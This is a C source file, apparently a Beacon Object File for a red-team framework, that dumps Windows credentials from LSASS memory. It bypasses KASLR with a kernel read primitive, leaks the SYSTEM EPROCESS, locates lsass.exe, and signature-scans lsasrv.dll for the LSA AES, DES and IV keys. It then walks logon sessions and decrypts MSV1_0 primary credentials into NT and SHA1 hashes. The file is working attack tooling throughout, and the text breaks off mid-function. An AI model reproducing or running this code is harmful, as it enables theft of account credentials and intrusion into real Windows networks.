#include "lsa.h"
#include "crypto.h"

// ================================================================
// DLL reading from disk (no LoadLibrary)
// ================================================================
typedef struct {
    uint32_t virtual_address;
    uint32_t virtual_size;
    uint32_t raw_offset;
    uint32_t raw_size;
} PeSectionInfo;


Bytes read_dll_from_disk(const wchar_t* dll_name) {
    Bytes empty;
    MSVCRT$memset(&empty, 0, sizeof(empty));

    wchar_t sys_dir[MAX_PATH] = {0};
    GetSystemDirectoryW(sys_dir, MAX_PATH);
    size_t sl = MSVCRT$wcslen(sys_dir);

    wchar_t path[MAX_PATH] = {0};
    MSVCRT$memcpy(path, sys_dir, sl * sizeof(wchar_t));
    path[sl] = L'\\';
    size_t nl = MSVCRT$wcslen(dll_name);
    MSVCRT$memcpy(path + sl + 1, dll_name, (nl + 1) * sizeof(wchar_t));

    HANDLE f = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) return empty;

    // Get size
    DWORD sz = GetFileSize(f, NULL);
    if (sz == INVALID_FILE_SIZE || sz == 0) { CloseHandle(f); return empty; }

    Bytes data = Bytes_alloc(sz);
    data.size = sz;
    DWORD read_bytes = 0;
    BOOL ok = ReadFile(f, data.data, sz, &read_bytes, NULL);
    CloseHandle(f);

    if (!ok || read_bytes != sz) { Bytes_free(&data); return empty; }
    return data;
}

PeSectionInfo find_pe_text_section(const Bytes* pe) {
    PeSectionInfo empty = {0};
    if (pe->size < 0x200) return empty;
    uint32_t pe_off = rd(pe->data, 0x3C);
    if (pe_off + 0x18 > pe->size) return empty;
    uint16_t nsec = rw(pe->data, pe_off + 6);
    uint16_t opt_sz = rw(pe->data, pe_off + 0x14);
    uint32_t sec_start = pe_off + 0x18 + opt_sz;
    uint16_t i;
    for (i = 0; i < nsec; i++) {
        uint32_t s = sec_start + i * 40;
        if (s + 40 > pe->size) break;
        if (MSVCRT$memcmp(pe->data + s, ".text", 5) == 0) {
            PeSectionInfo info;
            info.virtual_address = rd(pe->data, s + 12);
            info.virtual_size    = rd(pe->data, s + 8);
            info.raw_offset      = rd(pe->data, s + 20);
            info.raw_size        = rd(pe->data, s + 16);
            return info;
        }
    }
    return empty;
}

uint32_t local_search(const uint8_t* mem, uint32_t size,
                       const uint8_t* sig, uint32_t sig_len) {
    uint32_t i;
    for (i = 0; i + sig_len <= size; i++)
        if (MSVCRT$memcmp(mem + i, sig, sig_len) == 0) return i;
    return 0;
}

uint32_t resolve_rip_raw(const uint8_t* text_raw, uint32_t text_va,
                          uint32_t instruction_off) {
    int32_t disp;
    MSVCRT$memcpy(&disp, text_raw + instruction_off, 4);
    uint32_t rva = text_va + instruction_off + 4;
    return (uint32_t)((int32_t)rva + disp);
}

// ================================================================
// BCrypt key handle extraction from LSASS memory
// ================================================================
Bytes extract_bcrypt_key(HANDLE h, uint64_t dtb, uint64_t ptr_va, uint32_t hk_off) {
    Bytes empty;
    MSVCRT$memset(&empty, 0, sizeof(empty));

    uint64_t handle_va = read_ptr(h, dtb, ptr_va);
    if (!handle_va) return empty;

    Bytes hk = proc_read(h, dtb, handle_va, 0x20);
    if (hk.size < 0x20) { Bytes_free(&hk); return empty; }

    // Check for RUUU tag at offset 4
    if (MSVCRT$memcmp(hk.data + 4, "RUUU", 4) != 0) { Bytes_free(&hk); return empty; }

    uint64_t key_va = rp(hk.data, 0x10);
    Bytes_free(&hk);
    if (!key_va) return empty;

    Bytes kd = proc_read(h, dtb, key_va, hk_off + 0x30);
    if (kd.size < hk_off + 0x30) { Bytes_free(&kd); return empty; }

    uint32_t cb = rd(kd.data, hk_off);
    if (cb == 0 || cb > 64) { Bytes_free(&kd); return empty; }

    Bytes result = Bytes_copy(kd.data + hk_off + 4, cb);
    Bytes_free(&kd);
    return result;
}

// ================================================================
// KASLR bypass via SubCmd 2
// ================================================================
BOOL kaslr_bypass(HANDLE h, SubCmd2Info* out) {
    MSVCRT$memset(out, 0, sizeof(*out));

    Bytes regs = subcmd2(h);
    if (Bytes_empty(&regs) || regs.size < 448) {
        Bytes_free(&regs);
        internal_printf("[-] SubCmd 2 failed\n");
        return FALSE;
    }

    uint64_t idtr = 0, cr3 = 0;
    size_t i;
    for (i = 0; i + 15 < regs.size; i += 16) {
        char name[9] = {0};
        MSVCRT$memcpy(name, regs.data + i, 8);
        uint64_t val = rp(regs.data, i + 8);
        if (MSVCRT$memcmp(name, "idtr", 4) == 0) idtr = val;
        if (MSVCRT$memcmp(name, "cr3 ", 4) == 0) cr3 = val;
    }
    Bytes_free(&regs);

    internal_printf("  idtr=0x%llx cr3=0x%llx\n", idtr, cr3);

    if (!idtr) {
        internal_printf("[-] No IDTR in SubCmd 2 output\n");
        return FALSE;
    }

    Bytes idt = virt_read(h, idtr, 256);
    if (Bytes_empty(&idt)) {
        Bytes_free(&idt);
        internal_printf("[-] Failed to read IDT\n");
        return FALSE;
    }

    uint64_t min_isr = 0;
    size_t n_entries = idt.size / 16;
    if (n_entries > 16) n_entries = 16;
    for (i = 0; i < n_entries; i++) {
        const uint8_t* e = idt.data + i * 16;
        uint64_t isr = (uint64_t)rw(e, 0)
                     | ((uint64_t)rw(e, 6) << 16)
                     | ((uint64_t)rd(e, 8) << 32);
        if (isr > 0xFFFF000000000000ULL) {
            if (min_isr == 0 || isr < min_isr) min_isr = isr;
        }
    }
    Bytes_free(&idt);

    if (!min_isr) {
        internal_printf("[-] No valid ISR in IDT\n");
        return FALSE;
    }

    uint64_t ntos_base = 0;
    uint64_t scan_base = min_isr & ~0xFFFULL;
    for (uint32_t j = 0; j < 4096; j++) {
        Bytes page = virt_read(h, scan_base - j * 0x1000, 2);
        if (page.size >= 2 && page.data[0] == 'M' && page.data[1] == 'Z') {
            ntos_base = scan_base - j * 0x1000;
            Bytes_free(&page);
            break;
        }
        Bytes_free(&page);
    }

    if (!ntos_base) {
        internal_printf("[-] ntoskrnl base not found\n");
        return FALSE;
    }

    out->ntos_base = ntos_base;
    out->cr3 = cr3;
    return TRUE;
}

// ================================================================
// Handle table structures for EPROCESS leak
// ================================================================
typedef struct {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR  ObjectTypeIndex;
    UCHAR  HandleAttributes;
    USHORT HandleValue;
    PVOID  Object;
    ULONG  GrantedAccess;
} SYSTEM_HANDLE_ENTRY;

typedef struct {
    ULONG Count;
    SYSTEM_HANDLE_ENTRY Handles[1];
} SYSTEM_HANDLE_INFO;


uint64_t leak_system_eprocess(void) {
    BOOLEAN old = FALSE;
    RtlAdjustPrivilege(20 /* SE_DEBUG_PRIVILEGE */, TRUE, FALSE, &old);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 4);
    if (!hProcess) {
        internal_printf("[-] OpenProcess(PID 4) failed: %lu\n", GetLastError());
        return 0;
    }

    DWORD my_pid = GetCurrentProcessId();
    USHORT my_handle = (USHORT)(uintptr_t)hProcess;

    internal_printf("  Handle to SYSTEM (PID 4), our PID=%lu, handle=0x%x\n",
                 my_pid, my_handle);

    ULONG len = sizeof(SYSTEM_HANDLE_INFO);
    SYSTEM_HANDLE_INFO* info = NULL;
    LONG status;
    ULONG out_len;

    do {
        len *= 2;
        if (info) GlobalFree(info);
        info = (SYSTEM_HANDLE_INFO*)GlobalAlloc(GMEM_ZEROINIT, len);
        if (!info) {
            CloseHandle(hProcess);
            internal_printf("[-] GlobalAlloc failed\n");
            return 0;
        }
        status = NtQuerySystemInformation(16, info, len, &out_len);
    } while (status == (LONG)0xC0000004);

    if (status != 0) {
        CloseHandle(hProcess);
        GlobalFree(info);
        internal_printf("[-] NtQuerySystemInformation(16) failed: 0x%lx\n", (unsigned long)status);
        return 0;
    }

    internal_printf("  Handle table: %lu entries\n", info->Count);

    uint64_t system_eprocess = 0;
    ULONG i;
    for (i = 0; i < info->Count; i++) {
        SYSTEM_HANDLE_ENTRY* entry = &info->Handles[i];
        if (entry->UniqueProcessId == (USHORT)my_pid &&
            entry->HandleValue == my_handle) {
            system_eprocess = (uint64_t)(uintptr_t)entry->Object;
            internal_printf("  SYSTEM EPROCESS=0x%llx\n", system_eprocess);
            break;
        }
    }

    CloseHandle(hProcess);
    GlobalFree(info);

    if (!system_eprocess)
        internal_printf("[-] Handle not found in system handle table\n");

    return system_eprocess;
}

// ================================================================
// Find LSASS.exe
// ================================================================
BOOL find_LSASS(HANDLE h, LSASSInfo* out) {
    MSVCRT$memset(out, 0, sizeof(*out));

    uint64_t sys_ep = leak_system_eprocess();
    if (!sys_ep) return FALSE;

    Bytes ep_data = virt_read(h, sys_ep, 0x800);
    if (ep_data.size < 0x800) {
        Bytes_free(&ep_data);
        internal_printf("[-] Cannot read SYSTEM EPROCESS\n");
        return FALSE;
    }

    uint32_t off_pid = 0, off_links = 0, off_name = 0;
    uint32_t off;
    for (off = 0x100; off < 0x600; off += 8) {
        if (rp(ep_data.data, off) == 4) {
            uint64_t nxt = rp(ep_data.data, off + 8);
            if (nxt > 0xFFFF000000000000ULL) {
                off_pid   = off;
                off_links = off + 8;
                break;
            }
        }
    }
    for (off = 0x200; off < 0x700; off++) {
        if (ep_data.data[off] == 'S' &&
            MSVCRT$memcmp(ep_data.data + off, "System\0", 7) == 0) {
            off_name = off;
            break;
        }
    }
    Bytes_free(&ep_data);

    internal_printf("  Offsets: PID=0x%x Links=0x%x Name=0x%x\n",
                 off_pid, off_links, off_name);

    if (!off_pid || !off_name) {
        internal_printf("[-] Cannot detect EPROCESS offsets\n");
        return FALSE;
    }

    uint64_t head = sys_ep + off_links;
    Bytes flink_data = virt_read(h, head, 8);
    if (flink_data.size < 8) {
        Bytes_free(&flink_data);
        return FALSE;
    }
    uint64_t cur = rp(flink_data.data, 0);
    Bytes_free(&flink_data);

    int proc_count = 0;
    // Simple seen-set using a heap array (up to 512 entries — stack would trigger ___chkstk_ms)
    #define SEEN_MAX 512
    uint64_t* seen = (uint64_t*)MSVCRT$malloc(SEEN_MAX * sizeof(uint64_t));
    if (!seen) return FALSE;
    int seen_count = 0;
    seen[seen_count++] = head;

    int iter;
    for (iter = 0; iter < 500; iter++) {
        if (!cur || cur < 0xFFFF000000000000ULL) break;
        // Check seen
        int already = 0;
        int si;
        for (si = 0; si < seen_count; si++) if (seen[si] == cur) { already = 1; break; }
        if (already) break;
        if (seen_count < SEEN_MAX) seen[seen_count++] = cur;

        uint64_t ep = cur - off_links;

        Bytes nm = virt_read(h, ep + off_name, 16);
        if (Bytes_empty(&nm)) {
            Bytes_free(&nm);
            Bytes nd = virt_read(h, cur, 8);
            cur = (nd.size >= 8) ? rp(nd.data, 0) : 0;
            Bytes_free(&nd);
            continue;
        }
        if (nm.size < 16) nm.data[nm.size > 0 ? nm.size-1 : 0] = 0;
        else nm.data[15] = 0;
        proc_count++;

        char img[17] = {0};
        MSVCRT$memcpy(img, nm.data, 16);
        Bytes_free(&nm);

        // Lowercase compare
        char img_lower[17] = {0};
        int ci;
        for (ci = 0; ci < 16 && img[ci]; ci++) {
            char c = img[ci];
            if (c >= 'A' && c <= 'Z') c += 32;
            img_lower[ci] = c;
        }

        if (MSVCRT$memcmp(img_lower, "lsass.exe\0", 10) == 0 ||
            MSVCRT$memcmp(img_lower, "LSASS.exe\0", 10) == 0) {
            Bytes dtb_data = virt_read(h, ep + 0x28, 8);
            if (dtb_data.size < 8) { Bytes_free(&dtb_data); MSVCRT$free(seen); return FALSE; }
            uint64_t dtb = rp(dtb_data.data, 0);
            Bytes_free(&dtb_data);

            Bytes pid_data = virt_read(h, ep + off_pid, 8);
            uint64_t pid = (pid_data.size >= 8) ? rp(pid_data.data, 0) : 0;
            Bytes_free(&pid_data);
            internal_printf("  %s PID=%llu DTB=0x%llx\n", img, pid, dtb);

            // Auto-detect PEB offset
            Bytes ep2 = virt_read(h, ep, 0x800);
            if (ep2.size >= 0x800) {
                uint32_t poff;
                for (poff = 0x100; poff < 0x600; poff += 8) {
                    uint64_t val = rp(ep2.data, poff);
                    if (val <= 0x10000 || val >= 0x7FFFFFFFFFFFULL) continue;
                    Bytes peb = proc_read(h, dtb, val, 0x20);
                    if (peb.size < 0x20) { Bytes_free(&peb); continue; }
                    int all_zero = 1;
                    size_t bi;
                    for (bi = 0; bi < 0x20; bi++) if (peb.data[bi] != 0) { all_zero = 0; break; }
                    if (all_zero) { Bytes_free(&peb); continue; }
                    uint64_t ldr = rp(peb.data, 0x18);
                    uint64_t im  = rp(peb.data, 0x10);
                    Bytes_free(&peb);
                    if (ldr > 0x10000 && ldr < 0x7FFFFFFFFFFFULL &&
                        im  > 0x10000 && im  < 0x7FFFFFFFFFFFULL) {
                        internal_printf("  PEB=0x%llx LDR=0x%llx poff=0x%x\n", val, ldr, poff);
                        Bytes_free(&ep2);
                        MSVCRT$free(seen);
                        out->eprocess   = ep;
                        out->dtb        = dtb;
                        out->peb_offset = poff;
                        return TRUE;
                    }
                }
            }
            Bytes_free(&ep2);
            MSVCRT$free(seen);
            internal_printf("[-] Cannot detect PEB offset\n");
            return FALSE;
        }

        Bytes nd = virt_read(h, cur, 8);
        cur = (nd.size >= 8) ? rp(nd.data, 0) : 0;
        Bytes_free(&nd);
    }

    MSVCRT$free(seen);
    internal_printf("[-] LSASS/lsass.exe not found (%d processes)\n", proc_count);
    return FALSE;
}

// ================================================================
// Find module in process module list
// ================================================================
BOOL find_module(HANDLE h, uint64_t dtb, uint64_t ep, uint32_t peb_off,
                 const wchar_t* target_name, ModuleInfo* out) {
    MSVCRT$memset(out, 0, sizeof(*out));

    Bytes peb_ptr_data = virt_read(h, ep + peb_off, 8);
    if (peb_ptr_data.size < 8) { Bytes_free(&peb_ptr_data); return FALSE; }
    uint64_t peb_va = rp(peb_ptr_data.data, 0);
    Bytes_free(&peb_ptr_data);

    Bytes peb = proc_read(h, dtb, peb_va, 0x20);
    if (peb.size < 0x20) { Bytes_free(&peb); return FALSE; }
    uint64_t ldr = rp(peb.data, 0x18);
    Bytes_free(&peb);

    uint64_t head = ldr + 0x20;
    uint64_t cur = read_ptr(h, dtb, head);

    #define MOD_SEEN_MAX 256
    uint64_t seen[MOD_SEEN_MAX];
    int seen_count = 0;
    seen[seen_count++] = head;

    int iter;
    for (iter = 0; iter < 200; iter++) {
        if (!cur) break;
        int already = 0;
        int si;
        for (si = 0; si < seen_count; si++) if (seen[si] == cur) { already = 1; break; }
        if (already) break;
        if (seen_count < MOD_SEEN_MAX) seen[seen_count++] = cur;

        Bytes entry = proc_read(h, dtb, cur - 0x10, 0x80);
        if (entry.size < 0x80) { Bytes_free(&entry); break; }

        uint64_t dll_base = rp(entry.data, 0x30);
        uint32_t dll_size = rd(entry.data, 0x40);
        uint16_t name_len = rw(entry.data, 0x48);
        uint64_t name_ptr = rp(entry.data, 0x50);

        if (name_len && name_ptr) {
            uint16_t clamped = name_len;
            if (clamped > 512) clamped = 512;
            Bytes raw = proc_read(h, dtb, name_ptr, clamped);
            if (raw.size >= 2) {
                wchar_t name[256] = {0};
                size_t wlen = raw.size / sizeof(wchar_t);
                if (wlen >= 256) wlen = 255;
                MSVCRT$memcpy(name, raw.data, wlen * sizeof(wchar_t));
                name[wlen] = L'\0';
                // lowercase
                size_t ci;
                for (ci = 0; ci < wlen; ci++) {
                    if (name[ci] >= L'A' && name[ci] <= L'Z') name[ci] += 32;
                }
                // Find target in name
                // Simple wcsstr equivalent
                size_t tlen = MSVCRT$wcslen(target_name);
                size_t ni;
                int found = 0;
                for (ni = 0; ni + tlen <= wlen; ni++) {
                    if (MSVCRT$memcmp(name + ni, target_name, tlen * sizeof(wchar_t)) == 0) {
                        found = 1; break;
                    }
                }
                if (found) {
                    internal_printf("  Found module base=0x%llx size=0x%x\n",
                                 dll_base, dll_size);
                    out->base = dll_base;
                    out->size = dll_size;
                    Bytes_free(&raw);
                    Bytes_free(&entry);
                    return TRUE;
                }
            }
            Bytes_free(&raw);
        }

        cur = rp(entry.data, 0x10);
        Bytes_free(&entry);
    }
    return FALSE;
}

// ================================================================
// LsaKeys helpers
// ================================================================
void LsaKeys_free(LsaKeys* keys) {
    Bytes_free(&keys->iv);
    Bytes_free(&keys->aes_key);
    Bytes_free(&keys->des_key);
}

// ================================================================
// Extract LSA encryption keys (local file scan + remote key reads)
// ================================================================
BOOL extract_lsa_keys(HANDLE h, uint64_t dtb, uint64_t base, uint32_t size, LsaKeys* out) {
    MSVCRT$memset(out, 0, sizeof(*out));

    // LSA patterns on stack - no static/global initialized data in BOFs
    const uint8_t lsa_pat_a[] = {
        0x83,0x64,0x24,0x30,0x00,0x48,0x8d,0x45,0xe0,0x44,0x8b,0x4d,0xd8,0x48,0x8d,0x15
    };
    const uint8_t lsa_pat_b[] = {
        0x83,0x64,0x24,0x30,0x00,0x44,0x8b,0x4d,0xd8,0x48,0x8b,0x0d
    };
    const uint8_t lsa_pat_c[] = {
        0x83,0x64,0x24,0x30,0x00,0x44,0x8b,0x4c,0x24,0x48,0x48,0x8b,0x0d
    };
    const LsaSig lsa_sigs[] = {
        { lsa_pat_a, sizeof(lsa_pat_a),  71, -89, 16, 0x38 },
        { lsa_pat_a, sizeof(lsa_pat_a),  58, -89, 16, 0x38 },
        { lsa_pat_a, sizeof(lsa_pat_a),  67, -89, 16, 0x38 },
        { lsa_pat_a, sizeof(lsa_pat_a),  61, -73, 16, 0x38 },
        { lsa_pat_b, sizeof(lsa_pat_b),  62, -70, 23, 0x38 },
        { lsa_pat_b, sizeof(lsa_pat_b),  62, -70, 23, 0x28 },
        { lsa_pat_b, sizeof(lsa_pat_b),  58, -62, 23, 0x28 },
        { lsa_pat_c, sizeof(lsa_pat_c),  59, -61, 25, 0x18 },
        { lsa_pat_c, sizeof(lsa_pat_c),  63, -69, 25, 0x18 },
    };
    const size_t lsa_sigs_count = sizeof(lsa_sigs)/sizeof(lsa_sigs[0]);

    Bytes dll = read_dll_from_disk(L"lsasrv.dll");
    if (Bytes_empty(&dll)) {
        internal_printf("[-] Cannot read lsasrv.dll from disk\n");
        return FALSE;
    }

    PeSectionInfo text = find_pe_text_section(&dll);
    if (!text.raw_size) {
        Bytes_free(&dll);
        internal_printf("[-] Cannot find .text in lsasrv.dll\n");
        return FALSE;
    }

    const uint8_t* text_raw = dll.data + text.raw_offset;
    size_t si;
    BOOL found = FALSE;

    for (si = 0; si < lsa_sigs_count && !found; si++) {
        const LsaSig* sig = &lsa_sigs[si];
        uint32_t sig_off = local_search(text_raw, text.raw_size,
                                        sig->pattern, (uint32_t)sig->pattern_len);
        if (!sig_off) continue;

        int32_t iv_idx  = (int32_t)sig_off + sig->iv_off;
        int32_t des_idx = (int32_t)sig_off + sig->des_off;
        int32_t aes_idx = (int32_t)sig_off + sig->aes_off;

        if (iv_idx < 0 || des_idx < 0 || aes_idx < 0) continue;

        uint32_t iv_rva  = resolve_rip_raw(text_raw, text.virtual_address, (uint32_t)iv_idx);
        uint32_t des_rva = resolve_rip_raw(text_raw, text.virtual_address, (uint32_t)des_idx);
        uint32_t aes_rva = resolve_rip_raw(text_raw, text.virtual_address, (uint32_t)aes_idx);

        Bytes iv = proc_read(h, dtb, base + iv_rva, 16);
        if (iv.size < 16) { Bytes_free(&iv); continue; }
        int all_zero = 1;
        size_t bi;
        for (bi = 0; bi < 16; bi++) if (iv.data[bi] != 0) { all_zero = 0; break; }
        if (all_zero) { Bytes_free(&iv); continue; }

        Bytes des_key = extract_bcrypt_key(h, dtb, base + des_rva, sig->hk_off);
        Bytes aes_key = extract_bcrypt_key(h, dtb, base + aes_rva, sig->hk_off);

        if (!Bytes_empty(&des_key) && !Bytes_empty(&aes_key)) {
            out->iv      = iv;
            out->des_key = des_key;
            out->aes_key = aes_key;
            found = TRUE;
        } else {
            Bytes_free(&iv);
            Bytes_free(&des_key);
            Bytes_free(&aes_key);
        }
    }

    Bytes_free(&dll);
    if (!found)
        internal_printf("[-] LSA keys not found\n");
    return found;
}

// ================================================================
// Find LogonSessionList
// ================================================================
BOOL find_logon_list(HANDLE h, uint64_t dtb, uint64_t base, uint32_t size, uint32_t build, LogonListInfo* out) {
    MSVCRT$memset(out, 0, sizeof(*out));

    // MSV patterns on stack - no static/global initialized data in BOFs
    const uint8_t msv_pat0[] = { 0x45,0x89,0x34,0x24,0x48,0x8b,0xfb,0x45,0x85,0xc0,0x0f };
    const uint8_t msv_pat1[] = { 0x45,0x89,0x34,0x24,0x8b,0xfb,0x45,0x85,0xc0,0x0f };
    const uint8_t msv_pat2[] = { 0x45,0x89,0x37,0x49,0x4c,0x8b,0xf7,0x8b,0xf3,0x45,0x85,0xc0,0x0f };
    const uint8_t msv_pat3[] = { 0x45,0x89,0x34,0x24,0x4c,0x8b,0xff,0x8b,0xf3,0x45,0x85,0xc0,0x74 };
    const uint8_t msv_pat4[] = { 0x33,0xff,0x41,0x89,0x37,0x4c,0x8b,0xf3,0x45,0x85,0xc0,0x74 };
    const uint8_t msv_pat5[] = { 0x33,0xff,0x41,0x89,0x37,0x4c,0x8b,0xf3,0x45,0x85,0xc9,0x74 };
    const uint8_t msv_pat6[] = { 0x33,0xff,0x45,0x89,0x37,0x48,0x8b,0xf3,0x45,0x85,0xc9,0x74 };
    const uint8_t msv_pat7[] = { 0x33,0xff,0x41,0x89,0x37,0x4c,0x8b,0xf3,0x45,0x85,0xc0,0x74 };
    const MsvSig msv_sigs[] = {
        { msv_pat0, sizeof(msv_pat0), 25, -16, 34, 26200 },
        { msv_pat1, sizeof(msv_pat1), 25, -16, 34, 26100 },
        { msv_pat2, sizeof(msv_pat2), 27,  -4,  0, 22631 },
        { msv_pat3, sizeof(msv_pat3), 24,  -4,  0, 20348 },
        { msv_pat4, sizeof(msv_pat4), 23,  -4,  0, 18362 },
        { msv_pat5, sizeof(msv_pat5), 23,  -4,  0, 17134 },
        { msv_pat6, sizeof(msv_pat6), 23,  -4,  0, 15063 },
        { msv_pat7, sizeof(msv_pat7), 16,  -4,  0, 10240 },
    };
    const size_t msv_sigs_count = sizeof(msv_sigs)/sizeof(msv_sigs[0]);

    Bytes dll = read_dll_from_disk(L"lsasrv.dll");
    if (Bytes_empty(&dll)) {
        internal_printf("[-] Cannot read lsasrv.dll for LogonSessionList\n");
        return FALSE;
    }

    PeSectionInfo text = find_pe_text_section(&dll);
    if (!text.raw_size) {
        Bytes_free(&dll);
        return FALSE;
    }

    const uint8_t* text_raw = dll.data + text.raw_offset;
    BOOL found = FALSE;
    size_t si;

    for (si = 0; si < msv_sigs_count && !found; si++) {
        const MsvSig* sig = &msv_sigs[si];
        if (build < sig->min_build) continue;

        uint32_t sig_off = local_search(text_raw, text.raw_size,
                                        sig->pattern, (uint32_t)sig->pattern_len);
        if (!sig_off) continue;

        int32_t fe_idx = (int32_t)sig_off + sig->fe_off;
        if (fe_idx < 0 || (uint32_t)fe_idx + 4 > text.raw_size) continue;

        uint32_t fe_rva = resolve_rip_raw(text_raw, text.virtual_address, (uint32_t)fe_idx);
        uint64_t list_ptr = base + fe_rva;

        if (sig->corr_off) {
            int32_t corr_idx = (int32_t)sig_off + sig->corr_off;
            if (corr_idx >= 0 && (uint32_t)corr_idx + 4 <= text.raw_size) {
                uint32_t extra = rd(text_raw, (size_t)corr_idx);
                list_ptr += extra;
            }
        }

        uint64_t head = read_ptr(h, dtb, list_ptr);
        if (!head || head == list_ptr) continue;

        uint32_t count = 1;
        if (build >= 9200 && sig->cnt_off) {
            int32_t cnt_idx = (int32_t)sig_off + sig->cnt_off;
            if (cnt_idx >= 0 && (uint32_t)cnt_idx + 4 <= text.raw_size) {
                uint32_t cnt_rva = resolve_rip_raw(text_raw, text.virtual_address, (uint32_t)cnt_idx);
                Bytes cb = proc_read(h, dtb, base + cnt_rva, 1);
                if (!Bytes_empty(&cb) && cb.data[0]) count = cb.data[0];
                Bytes_free(&cb);
            }
        }

        out->list_ptr = list_ptr;
        out->count    = count;
        found = TRUE;
    }

    Bytes_free(&dll);
    if (!found)
        internal_printf("[-] LogonSessionList not found\n");
    return found;
}

// ================================================================
// InformationList helpers
// ================================================================
void InformationList_init(InformationList* list) {
    list->items = NULL; list->count = 0; list->capacity = 0;
}

void InformationList_push(InformationList* list, const information* item) {
    if (list->count >= list->capacity) {
        size_t new_cap = list->capacity < 16 ? 16 : list->capacity * 2;
        information* new_items = (information*)MSVCRT$malloc(new_cap * sizeof(information));
        if (list->items) {
            MSVCRT$memcpy(new_items, list->items, list->count * sizeof(information));
            MSVCRT$free(list->items);
        }
        list->items = new_items;
        list->capacity = new_cap;
    }
    list->items[list->count++] = *item;
}

void InformationList_free(InformationList* list) {
    if (list->items) { MSVCRT$free(list->items); list->items = NULL; }
    list->count = 0; list->capacity = 0;
}

// ================================================================
// WDigestList helpers
// ================================================================
void WDigestList_init(WDigestList* list) {
    list->items = NULL; list->count = 0; list->capacity = 0;
}

void WDigestList_push(WDigestList* list, const WDigestinformation* item) {
    if (list->count >= list->capacity) {
        size_t new_cap = list->capacity < 16 ? 16 : list->capacity * 2;
        WDigestinformation* new_items = (WDigestinformation*)MSVCRT$malloc(new_cap * sizeof(WDigestinformation));
        if (list->items) {
            MSVCRT$memcpy(new_items, list->items, list->count * sizeof(WDigestinformation));
            MSVCRT$free(list->items);
        }
        list->items = new_items;
        list->capacity = new_cap;
    }
    list->items[list->count++] = *item;
}

void WDigestList_free(WDigestList* list) {
    if (list->items) { MSVCRT$free(list->items); list->items = NULL; }
    list->count = 0; list->capacity = 0;
}

// ================================================================
// Walk MSV1_0 primary credential structures
// ================================================================
void walk_primary(HANDLE h, uint64_t dtb, uint64_t pc_ptr,
                          const LsaKeys* keys,
                          InformationList* results,
                          const wchar_t* user, const wchar_t* domain) {
    uint64_t seen_list[20];
    int seen_count = 0;
    uint64_t cur = pc_ptr;

    while (cur && seen_count < 20) {
        int already = 0;
        int si;
        for (si = 0; si < seen_count; si++) if (seen_list[si] == cur) { already = 1; break; }
        if (already) break;
        seen_list[seen_count++] = cur;

        Bytes pd = proc_read(h, dtb, cur, 0x60);
        if (pd.size < 0x60) { Bytes_free(&pd); break; }

        int all_zero = 1;
        size_t bi;
        for (bi = 0; bi < pd.size; bi++) if (pd.data[bi] != 0) { all_zero = 0; break; }
        if (all_zero) { Bytes_free(&pd); break; }

        uint64_t nxt     = rp(pd.data, 0);
        char    pkg[64]  = {0};
        uint16_t enc_len = rw(pd.data, 0x18);
        uint64_t enc_buf = rp(pd.data, 0x20);
        read_astr(h, dtb, pd.data, 8, pkg, sizeof(pkg));
        Bytes_free(&pd);

        if (MSVCRT$memcmp(pkg, "Primary", 7) == 0 && enc_len > 0 && enc_len < 0x10000 && enc_buf) {
            Bytes blob = proc_read(h, dtb, enc_buf, enc_len);
            int blob_zero = 1;
            for (bi = 0; bi < blob.size; bi++) if (blob.data[bi] != 0) { blob_zero = 0; break; }

            if (!blob_zero) {
                Bytes dec = lsa_decrypt(blob.data, blob.size,
                                        keys->aes_key.data, keys->aes_key.size,
                                        keys->des_key.data, keys->des_key.size,
                                        keys->iv.data, keys->iv.size);
                if (dec.size >= 0x86 && !dec.data[40] && dec.data[41]) {
                    information item;
                    MSVCRT$memset(&item, 0, sizeof(item));
                    MSVCRT$memcpy(item.user,   user,   MSVCRT$wcslen(user)   < MAX_STR_LEN ? (MSVCRT$wcslen(user)   + 1) * sizeof(wchar_t) : (MAX_STR_LEN - 1) * sizeof(wchar_t));
                    MSVCRT$memcpy(item.domain, domain, MSVCRT$wcslen(domain) < MAX_STR_LEN ? (MSVCRT$wcslen(domain) + 1) * sizeof(wchar_t) : (MAX_STR_LEN - 1) * sizeof(wchar_t));
                    to_hex(item.nt_hash,  sizeof(item.nt_hash),  dec.data + 0x46, 16);
                    to_hex(item.sha_hash, sizeof(item.sha_hash), dec.data + 0x66, 20);
                    InformationList_push(results, &item);
                }
                Bytes_free(&dec);
            }
            Bytes_free(&blob);
        }

        if (!nxt || nxt == pc_ptr) break;
        cur = nxt;
    }
}

void walk_creds(HANDLE h, uint64_t dtb, uint64_t cred_ptr,
                        const LsaKeys* keys,
                        InformationList* results,
                        const wchar_t* user, const wchar_t* domain) {
    uint64_t seen_list[20];
    int seen_count = 0;
    uint64_t cur = cred_ptr;

    while (cur && seen_count < 20) {
        int already = 0;
        int si;
        for (si = 0; si < seen_count; si++) if (seen_list[si] == cur) { already = 1; break; }
        if (already) break;
        seen_list[seen_count++] = cur;

        Bytes cd = proc_read(h, dtb, cur, 0x20);
        if (cd.size < 0x20) { Bytes_free(&cd); break; }

        uint64_t nxt = rp(cd.data, 0);
        uint64_t pc  = rp(cd.data, 0x10);
        Bytes_free(&cd);

        if (pc)
            walk_primary(h, dtb, pc, keys, results, user, domain);

        if (!nxt || nxt == cred_ptr) break;
        cur = nxt;
    }
}

// ================================================================
// Walk all logon sessions
// ================================================================
void extract_creds(HANDLE h, uint64_t dtb,
                   uint64_t list_ptr, uint32_t count,
                   uint32_t build,
                   const LsaKeys* keys,
                   InformationList* out) {
    SessionOffsets offsets = session_offsets(build);
    uint32_t idx;
    for (idx = 0; idx < count; idx++) {
        uint64_t head_va = list_ptr + idx * 16;
        uint64_t entry = read_ptr(h, dtb, head_va);

        uint64_t seen_list[100];
        int seen_count = 0;
        seen_list[seen_count++] = head_va;

        while (entry) {
            int already = 0;
            int si;
            for (si = 0; si < seen_count; si++) if (seen_list[si] == entry) { already = 1; break; }
            if (already) break;
            if (seen_count < 100) seen_list[seen_count++] = entry;

            Bytes data = proc_read(h, dtb, entry, 0x200);
            if (data.size < 0x200) { Bytes_free(&data); break; }

            int all_zero = 1;
            size_t bi;
            for (bi = 0; bi < data.size; bi++) if (data.data[bi] != 0) { all_zero = 0; break; }
            if (all_zero) { Bytes_free(&data); break; }

